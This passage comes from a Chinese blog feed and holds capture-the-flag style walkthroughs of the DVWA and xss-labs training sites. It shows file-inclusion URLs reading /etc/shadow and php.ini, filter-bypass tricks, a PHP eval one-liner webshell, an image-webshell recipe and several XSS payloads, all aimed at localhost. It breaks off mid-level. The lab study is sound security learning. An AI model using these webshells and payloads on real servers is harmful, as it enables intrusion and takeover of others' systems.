database</span></span><br><span class="line"><span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"><span class="comment">// Feedback for the user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Issue with passwords matching</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>high级别的代码中添加了对token的验证，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p><p>参考文章<a href="https://www.freebuf.com/articles/web/118352.html">https://www.freebuf.com/articles/web/118352.html</a></p><p>参考文章<a href="https://www.cnblogs.com/xiaoqiyue/p/10144351.html">https://www.cnblogs.com/xiaoqiyue/p/10144351.html</a></p><h3 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h3><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码很少，就一行，没有对参数进行任何的处理，点击下面的三个链接，可以看到url中的变化</p><p><img src="https://s2.ax1x.com/2019/10/08/uhnmmd.png" alt="uhnmmd.png"></p><p>尝试读取shadow文件<a href="http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=/etc/shadow">http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=/etc/shadow</a></p><p><img src="https://s2.ax1x.com/2019/10/08/uhnJXQ.png" alt="uhnJXQ.png"></p><p>可以看到报错信息，可见不是Linux系统，而是Windows系统，同时也可以看到一个绝对路径<code>F:\phpstudy\PHPTutorial\WWW\DVWA\vulnerabilities\fi\index.php</code></p><p>尝试读取文件<code>http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=F:\phpstudy\PHPTutorial\WWW\DVWA\php.ini</code></p><p>上面使用的是绝对路径，也可以使用相对路径，<code>http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=..\..\php.ini</code></p><p><img src="https://s2.ax1x.com/2019/10/08/uhuXqJ.png" alt="uhuXqJ.png"></p><p>能够读取到php.ini配置文件，</p><p>远程文件包含</p><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态On时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p><p>假如，一个地址为x.x.x.x的服务器上包含一个phpinfo.txt文件，内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么就可以通过访问<code>http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=http://x.x.x.x/phpinfo.txt</code>，来执行phpinfo()函数</p><h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>medium的代码中对一些字符进行了过滤，”http://“，”https://“</p><p>，”../“, “..\“，</p><p>这里过滤了..\，<code>http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=..\..\php.ini</code>应该是无法读取文件的，但是这里依然可以读取，有点懵</p><p><img src="https://s2.ax1x.com/2019/10/08/uh8RfA.png" alt="uh8RfA.png"></p><p>这里使用绝对路径是完全没问题的</p><p><img src="https://s2.ax1x.com/2019/10/08/uhGitJ.png" alt="uhGitJ.png"></p><p>这里过滤了<code>http://</code>和<code>https://</code>，但是str_replace有很大的安全问题，可以使用大小写或者双写绕过这个检测，所以，远程文件包含，<code>http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=htthttp://p://x.x.x.x/phpinfo.txt</code>或者<code>http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=HTtp://x.x.x.x/phpinfo.txt</code>来实现远程文件包含。</p><h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line"><span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。<a href="https://www.w3school.com.cn/php/func_filesystem_fnmatch.asp">fnmatch</a></p><p>看似安全，但是可以利用file协议来读取文件</p><p><code>http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=file://F:\phpstudy\PHPTutorial\WWW\DVWA\php.ini</code></p><p><img src="https://s2.ax1x.com/2019/10/08/uhN4Z6.png" alt="uhN4Z6.png"></p><h3 id="file-upload"><a href="#file-upload" class="headerlink" title="file upload"></a>file upload</h3><p> 即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。 </p><h4 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Where are we going to be writing to?</span></span><br><span class="line"><span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line"><span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line"><span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line"><span class="comment">// No</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Yes!</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p> basename() 函数返回路径中的文件名部分。 </p></blockquote><p> 可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。 </p><p>所以，直接上传一个php马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hack&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/03/KXaYnO.png" alt="KXaYnO.png"></p><p>上传成功并且返回了文件路径，</p><p><img src="https://s2.ax1x.com/2019/11/03/KXdA5d.png" alt="KXdA5d.png"></p><p>尝试访问，是一个空白界面，但是确实是有这个界面的。</p><p><img src="https://s2.ax1x.com/2019/11/03/KXd9KK.png" alt="KXd9KK.png"></p><p>上菜刀</p><p><img src="https://s2.ax1x.com/2019/11/03/KX0dN4.png" alt="KX0dN4.png"></p><p><img src="https://s2.ax1x.com/2019/11/03/KX0RED.png" alt="KX0RED.png"></p><p>成功拿到shell</p><h4 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Where are we going to be writing to?</span></span><br><span class="line"><span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line"><span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// File information</span></span><br><span class="line"><span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is it an image?</span></span><br><span class="line"><span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line"><span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line"><span class="comment">// No</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Yes!</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Invalid file</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> medium代码中要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB） </p><p>用burpsuite抓包更改一下文件类型即可。（也可以上传一个shell.jpg，然后抓包修改为shell.php）</p><p> 在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为hack.php%00.png。 </p><p><img src="https://s2.ax1x.com/2019/11/03/KXrcD0.png" alt="KXrcD0.png"></p><p>成功上传，再次使用菜刀连接即可。</p><h4 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Where are we going to be writing to?</span></span><br><span class="line"><span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line"><span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"><span class="comment">// File information</span></span><br><span class="line"><span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line"><span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"><span class="comment">// Is it an image?</span></span><br><span class="line"><span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpeg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"><span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line"><span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line"><span class="comment">// No</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Yes!</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Invalid file</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> substr() 函数返回字符串的一部分。 </p><p> strrpos() 函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php     //找到“php”第一次出现的位置</span><br><span class="line">echo strrpos(&quot;I love php, I love php too!&quot;,&quot;php&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p> strtolower将字符串中所有的字母字符转换为小写并返回。 </p><p> getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。 </p><p>high的代码相当于一个白名单，只允许上传.jpg、.png、.jpeg后缀文件，文件大小小于100000。</p><p>所以，我们需要制作一个图片马，制作方法如下：</p><p>首先，找一个正常的图片test.jpg，然后再加上上面那样的php一句话木马，在cmd输入<code>copy test.jpg/b + shell.php/a picshell.jpg</code></p><p><img src="https://s2.ax1x.com/2019/11/03/KjlJN6.png" alt="KjlJN6.png"></p><p>得到的picshell.jpg文件中</p><p><img src="https://s2.ax1x.com/2019/11/03/KjlsEt.png" alt="KjlsEt.png"></p><p>可以看到木马已经写进来了，可以上传了。</p><p><img src="https://s2.ax1x.com/2019/11/03/KjJQTs.png" alt="KjJQTs.png"></p><p>直接上菜刀的话是不行的，因为这个文件不会被当成php来解析。所以这里要使用文件包含，文件包含有个漏洞，就是它不会识别是不是php文件，只要你使用了文件包含，它都会来当成php来解析，所以图片马就可被解析。</p><p> <code>http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=file:///F:/phpstudy/PHPTutorial/WWW/DVWA/hackable/uploads/picshell.jpg </code></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;一个小型靶场。&lt;/p&gt;
&lt;h3 id=&quot;Brute-Force&quot;&gt;&lt;a href=&quot;#Brute-Force&quot; class=&quot;headerlink&quot; title=&quot;Brute Force&quot;&gt;&lt;/a&gt;Brute Force&lt;/h3&gt;&lt;h4 id=&quot;DVWA-Security：low&quot;&gt;&lt;a href=&quot;#DVWA-Security：low&quot; class=&quot;headerlink&quot; title=&quot;DVWA Security：low&quot;&gt;&lt;/a&gt;DVWA Security：low&lt;/h4&gt;&lt;p&gt;这题的名字是爆破，那我们就爆破一下试试</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="DVWA" scheme="http://example.com/tags/DVWA/"/>
    
  </entry>
  
  <entry>
    <title>xsslabs通关</title>
    <link href="http://example.com/2019/09/30/%E9%9D%B6%E5%9C%BA/xsslabs%E9%80%9A%E5%85%B3/"/>
    <id>http://example.com/2019/09/30/%E9%9D%B6%E5%9C%BA/xsslabs%E9%80%9A%E5%85%B3/</id>
    <published>2019-09-30T01:10:22.000Z</published>
    <updated>2019-10-16T08:03:29.072Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>xss小游戏</p><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>看了看level1的源码<span id="more"></span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level2.php?keyword=test&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;name&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>通过$_GET[“name”]，获取name的值，没有过滤通过echo直接进行了输出，get请求的name变量放入xss脚本，完整的返回在html中，浏览器响应xss脚本</p><p>构造payload：<code>name=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p><p>在xss中拥有同样弹窗效果的函数不止<code>alert</code>，还有<code>confirm</code>以及<code>prompt</code></p><p>从代码角度去看，可以发现就是直接用GET方式获取参数然后输出到浏览器上面，这是典型的没做过滤。怎么防御？可以加一个转义函数<code>htmlspecialchars</code>把一些html格式的东西编码就可以有效防止了。</p><p><img src="https://s2.ax1x.com/2019/09/30/uJANSf.png" alt="uJANSf.png"></p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>像上一关一样输入<code>&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code>，并没有弹窗，回显如下：</p><p><img src="https://s2.ax1x.com/2019/09/30/uJEVBQ.png" alt="uJEVBQ.png"></p><p>再看看源码</p><p><img src="https://s2.ax1x.com/2019/09/30/uJEJHJ.png" alt="uJEJHJ.png"></p><p>划红线部分就是提交的参数了，我们发现这里是可以闭合前面的引号和**&gt;**，再构造xss弹窗</p><p>payload：<code>&quot;/&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code></p><p><img src="https://s2.ax1x.com/2019/09/30/uJVVxK.png" alt="uJVVxK.png"></p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>输入上一关的试试，当然没用</p><p><img src="https://s2.ax1x.com/2019/09/30/uJeruT.png" alt="uJeruT.png"></p><p>看看源码</p><p><img src="https://s2.ax1x.com/2019/09/30/uJef81.png" alt="uJef81.png"></p><p>发现提交的xss脚本中的**&lt;**和**&gt;**都没了，应该是被htmlspecialchars函数过滤了</p><p>所以这里可以用单引号闭合value，却没办法闭合input标签，但是可以注释掉后面标签然后用事件弹窗，这里介绍几个常用的事件函数，比如<code>onchange, onclick, oninput</code>等等</p><p>payload：<code>1&#39; onclick=alert(&quot;xss&quot;)//</code></p><p><img src="https://s2.ax1x.com/2019/09/30/uJKHyt.png" alt="uJKHyt.png"></p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>输入<code>&quot;/&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code>测试一下，</p><p><img src="https://s2.ax1x.com/2019/09/30/uJMFmV.png" alt="uJMFmV.png"></p><p>**&lt;**和**&gt;**依然被转义，再试试点击事件弹窗</p><p>payload：<code>1&quot; onclick=alert(&quot;xss&quot;)//</code></p><p><img src="https://s2.ax1x.com/2019/09/30/uJQkjI.png" alt="uJQkjI.png"></p><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>输入<code>&quot;/&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code>，发现<code>&lt;script&gt;</code>标签被过滤</p><p><img src="https://s2.ax1x.com/2019/09/30/uJQXGQ.png" alt="uJQXGQ.png"></p><p>输入<code>1&quot; onclick=alert(&quot;xss&quot;)//</code>测试，</p><p><img src="https://s2.ax1x.com/2019/09/30/uJQ029.png" 